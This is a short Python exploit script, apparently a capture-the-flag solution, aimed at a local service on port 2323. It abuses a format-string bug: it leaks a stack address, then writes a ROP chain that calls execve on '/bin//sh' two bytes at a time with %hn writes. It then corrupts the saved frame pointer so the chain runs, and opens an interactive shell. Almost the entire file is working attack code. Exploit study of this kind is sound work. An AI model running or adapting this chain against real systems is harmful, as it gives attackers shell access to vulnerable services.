#!/usr/bin/env python

#Evan Jensen (wont)
#07072013


from isis import *
from struct import pack
from time import sleep
chal=('localhost',2323)
s=get_socket(chal)


p=''
p += pack("<I", 0x080a71ba) # pop edx ; ret
p += pack("<I", 0x08138080) # @ .data
p += pack("<I", 0x0806d113) # pop eax ; ret
p += "/bin" # /bin
p += pack("<I", 0x080d762d) # mov DWORD PTR [edx],eax ; ret
p += pack("<I", 0x080a71ba) # pop edx ; ret
p += pack("<I", 0x08138084) # @ .data + 4
p += pack("<I", 0x0806d113) # pop eax ; ret
p += "//sh" # //sh
p += pack("<I", 0x080d762d) # mov DWORD PTR [edx],eax ; ret
p += pack("<I", 0x080a71ba) # pop edx ; ret
p += pack("<I", 0x08138088) # @ .data + 8
p += pack("<I", 0x08048c93) # xor eax,eax ; ret
p += pack("<I", 0x080d762d) # mov DWORD PTR [edx],eax ; ret
p += pack("<I", 0x08048211) # pop ebx ; ret
p += pack("<I", 0x08138080) # @ .data
p += pack("<I", 0x08126ad1) # pop ecx ; ret
p += pack("<I", 0x08138088) # @ .data + 8
p += pack("<I", 0x080a71ba) # pop edx ; ret
p += pack("<I", 0x08138088) # @ .data + 8
p += pack("<I", 0x08048c93) # xor eax,eax ; ret
p += pack("<I", 0x0805aceb) # inc eax ; ret
p += pack("<I", 0x0805aceb) # inc eax ; ret
p += pack("<I", 0x0805aceb) # inc eax ; ret
p += pack("<I", 0x0805aceb) # inc eax ; ret
p += pack("<I", 0x0805aceb) # inc eax ; ret
p += pack("<I", 0x0805aceb) # inc eax ; ret
p += pack("<I", 0x0805aceb) # inc eax ; ret
p += pack("<I", 0x0805aceb) # inc eax ; ret
p += pack("<I", 0x0805aceb) # inc eax ; ret
p += pack("<I", 0x0805aceb) # inc eax ; ret
p += pack("<I", 0x0805aceb) # inc eax ; ret
p += pack("<I", 0x0806cead) # int 0x80

halfs=[unpack("<H",i)[0] for i in chunk(p,2)]

def printfWrite(halfs,starting):
	ret=''
	starting=hex(starting)[2:].replace('L','')
	for i in halfs:
		ret+='dec %s\n'% starting
		ret+='echo %'+str(i).zfill(5)+'x%25$hn\n'
		starting=hex(int(starting,16)+2)[2:].replace('L','')
	return ret


def e():		
	junk=s.recv(0x1000)
	s.send('echo %6$x\n')
	sleep(.2)
	addr=s.recv(0x1000).splitlines()[1]
	addr=int(addr,16)&0xffff0000 #begining of page
	print "[*]write to %s" % hex(addr+4)
	corruption=printfWrite(halfs,addr+4).splitlines()
	for i in corruption:
		s.send(i+'\n')
		if 'dec' in i:
			print '[*]writing %s' % i.split(' ')[1]
		time.sleep(.1)
		junk=s.recv(0x100000)
	sleep(1)
	#stomp on old ebp. Just the lower two bytes
	#This will let ESP eventually take the address of our rop chain
	s.send("echo %6$hn\n")
	print "[*]rop"
	s.send('quit\n') #unwind that stack you dirty tramp
	print "[*]clean"
	sleep(1)
	junk=s.recv(0x1000)
	print "[*]shell"
	telnet_shell(s)

if __name__ == "__main__":
	e()
